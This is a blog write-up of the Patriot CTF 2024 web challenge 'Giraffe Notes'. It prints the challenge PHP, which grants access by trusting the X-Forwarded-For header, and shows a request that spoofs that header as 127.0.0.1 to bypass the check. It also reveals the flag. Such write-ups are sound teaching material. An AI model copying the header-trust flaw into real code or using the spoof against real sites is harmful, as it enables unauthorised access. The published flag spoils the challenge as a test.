---
layout: distill
title: Patriot CTF 2024 - Giraffe Notes
date: 2024-09-20
description: An easy, but good warmup web challenge
tags: write-ups
categories: ctf

authors:
  - name: Metassassin
    url: "https://metassassin.github.io"
    affiliations:
      name: Hellbound

toc:
  - name: Introduction
  - name: Steps
  - name: Lessons Learned
---

## Introduction

Giraffe notes was an easy beginner challenge for Patriot CTF 2024, but I thought it was a solid puzzle to warmup on. The team performed really well, and this was a challenge that I worked on alone when I had some time. I don't usually do web, but I read the challenge file and realized it would be pretty quick to complete.

Here is the challenge description:
{% include figure.liquid path="assets/img/WEB - Giraffe Notes.png" class="img-fluid rounded z-depth-1" zoomable=false %}

The challenge PHP file contents:
{% details Click here for code %}
  {% highlight php %} 
    {% raw %}
      <?php
      $allowed_ip = ['localhost', '127.0.0.1'];
      
      if (isset($_SERVER['HTTP_X_FORWARDED_FOR']) && in_array($_SERVER['HTTP_X_FORWARDED_FOR'], $allowed_ip)) {
          $allowed = true;
      } else {
          $allowed = false;
      }
      ?>
      
      <!DOCTYPE html>
      <html>
      
      <head>
          <title>Giraffe Notes</title>
          <script src="https://cdn.tailwindcss.com"></script>
          <script src="https://cdn.tailwindcss.com?plugins=forms,typography,aspect-ratio,line-clamp"></script>
          <script>
              tailwind.config = {
                  darkMode: 'class',
                  theme: {
                      extend: {
                          colors: {
                              primary: {
                                  "50": "#eff6ff",
                                  "100": "#dbeafe",
                                  "200": "#bfdbfe",
                                  "300": "#93c5fd",
                                  "400": "#60a5fa",
                                  "500": "#3b82f6",
                                  "600": "#2563eb",
                                  "700": "#1d4ed8",
                                  "800": "#1e40af",
                                  "900": "#1e3a8a"
                              }
                          }
                      },
                      fontFamily: {
                          'body': [
                              'Inter',
                              'ui-sans-serif',
                              'system-ui',
                              '-apple-system',
                              'system-ui',
                              'Segoe UI',
                              'Roboto',
                              'Helvetica Neue',
                              'Arial',
                              'Noto Sans',
                              'sans-serif',
                              'Apple Color Emoji',
                              'Segoe UI Emoji',
                              'Segoe UI Symbol',
                              'Noto Color Emoji'
                          ],
                          'sans': [
                              'Inter',
                              'ui-sans-serif',
                              'system-ui',
                              '-apple-system',
                              'system-ui',
                              'Segoe UI',
                              'Roboto',
                              'Helvetica Neue',
                              'Arial',
                              'Noto Sans',
                              'sans-serif',
                              'Apple Color Emoji',
                              'Segoe UI Emoji',
                              'Segoe UI Symbol',
                              'Noto Color Emoji'
                          ]
                      }
                  }
              }
          </script>
      </head>
      
      <body class="bg-gray-900 grid h-screen place-items-center">
          <?php
          if (!$allowed) {
          ?>
              <div class="py-8 px-4 mx-auto max-w-screen-xl lg:py-16 lg:px-6">
                  <div class="mx-auto text-center">
                      <h1 class="mb-4 text-7xl tracking-tight font-extrabold lg:text-9xl text-primary-600 text-primary-500">
                      🦒
                      </h1>
                      <p class="mb-4 text-3xl tracking-tight font-bold text-gray-900 md:text-4xl text-white">
                          Hah! Bet you cant access my notes on giraffes! They're super secure!
                      </p>
                  </div>
              </div>
          <?php
          } else {
          ?>
              <section class="bg-gray-900 antialiased">
                  <div class="max-w-screen-xl px-4 py-8 mx-auto lg:px-6 sm:py-16 lg:py-24">
                      <div class="max-w-3xl mx-auto text-center">
                          <h2 class="text-4xl font-extrabold leading-tight tracking-tight text-gray-900 text-white">
                              Notes
                          </h2>
                          <div class="mt-4">
                              <span class="inline-flex items-center text-lg font-medium text-primary-600 dark:text-primary-500">
                                  I like giraffes
                              </span>
                          </div>
                      </div>
                      <div class="flow-root max-w-3xl mx-auto mt-8 sm:mt-12 lg:mt-16">
                          <div class="-my-4 divide-y divide-gray-200 divide-gray-700">
                              <div class="flex flex-col gap-2 py-4 sm:gap-6 sm:flex-row sm:items-center">
                                  <p class="w-32 text-lg font-normal text-gray-500 sm:text-right text-gray-400 shrink-0">
                                      08:00 - 09:00
                                  </p>
                                  <h3 class="text-lg font-semibold text-gray-900 text-white">
                                      <span>Look at giraffes</span>
                                  </h3>
                              </div>
      
                              <div class="flex flex-col gap-2 py-4 sm:gap-6 sm:flex-row sm:items-center">
                                  <p class="w-32 text-lg font-normal text-gray-500 sm:text-right text-gray-400 shrink-0">
                                      09:00 - 10:00
                                  </p>
                                  <h3 class="text-lg font-semibold text-gray-900 text-white">
                                      <span>Think about giraffes</span>
                                  </h3>
                              </div>
      
                              <div class="flex flex-col gap-2 py-4 sm:gap-6 sm:flex-row sm:items-center">
                                  <p class="w-32 text-lg font-normal text-gray-500 sm:text-right text-gray-400 shrink-0">
                                      10:00 - 11:00
                                  </p>
                                  <h3 class="text-lg font-semibold text-gray-900 text-white">
                                      <span>Learn about giraffes</span>
                                  </h3>
                              </div>
      
                              <div class="flex flex-col gap-2 py-4 sm:gap-6 sm:flex-row sm:items-center">
                                  <p class="w-32 text-lg font-normal text-gray-500 sm:text-right text-gray-400 shrink-0">
                                      11:00 - Infinity
                                  </p>
                                  <h3 class="text-lg font-semibold text-gray-900 text-white">
                                      <span>CACI{placeholder}</span>
                                  </h3>
                              </div>
                          </div>
                      </div>
                  </div>
              </section>
          <?php
          }
          ?>
      </body>
      
      </html>
    {% endraw %}
  {% endhighlight %} 
{% enddetails %}

---

## Steps

1.) Obviously, start by visiting the web page. It taunts us with a message: "Hah! Bet you cant access my notes on giraffes! They're super secure!" Well, I will be the judge of that...

{% include figure.liquid path="assets/img/WEB - Giraffe Home.png" class="img-fluid rounded z-depth-1" zoomable=false %}

2.) Take this bit of information, download the html file and open it in a text editor. The very top of this file defines a variable, 'allowed,' whose value is either true or false depending on the presense of HTTP_X_FORWARDED_FOR:

{% details Click here for code %}
  {% highlight php %} 
    {% raw %}
      <?php
        $allowed_ip = ['localhost', '127.0.0.1'];
        
        if (isset($_SERVER['HTTP_X_FORWARDED_FOR']) && in_array($_SERVER['HTTP_X_FORWARDED_FOR'], $allowed_ip)) {
            $allowed = true;
        } else {
            $allowed = false;
        }
        ?>
    {% endraw %}
  {% endhighlight %} 
{% enddetails %}

3.) HTTP_X_FORWARDED_FOR is referencing the HTTP header which defines an IP address or servername that a request is being forwarded on behalf of, and the actual HTTP header for the request appears as `X-Forwarded-For: [IP]`. In this particular instance, the only option to make the variable 'allowed' a true value is localhost, or 127.0.0.1. 

4.) In Caido, I started by intercepting requests and visiting the challenge URL to capture the request so I can edit the headers. 

{% include figure.liquid path="assets/img/WEB - Giraffe Caido Request.png" class="img-fluid rounded z-depth-1" zoomable=false %}

5.) After adding the header, my request looked like the following:

{% details Click here for text %}
  {% highlight php %} 
    {% raw %}
      GET / HTTP/1.1
      Host: chal.competitivecyber.club:8081
      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:130.0) Gecko/20100101 Firefox/130.0
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,/;q=0.8
      Accept-Language: en-US,en;q=0.5
      Accept-Encoding: gzip, deflate
      Connection: keep-alive
      Upgrade-Insecure-Requests: 1
      Priority: u=0, i
      X-Forwarded-For: 127.0.0.1
    {% endraw %}
  {% endhighlight %} 
{% enddetails %}


6.) I sent the request, submitted my flag and got the solve: `CACI{1_lik3_g1raff3s_4_l0t}`

{% include figure.liquid path="assets/img/WEB - Giraffe Caido Response.png" class="img-fluid rounded z-depth-1" zoomable=false %}
{% include figure.liquid path="assets/img/WEB - Giraffe Flag.png" class="img-fluid rounded z-depth-1" zoomable=false %}

---

## Lessons Learned

1.) Caido is a great tool... very comparable to Burp of course, but nice.
2.) I should leave the beginner challenges for beginners.
3.) I'm a giraffe...
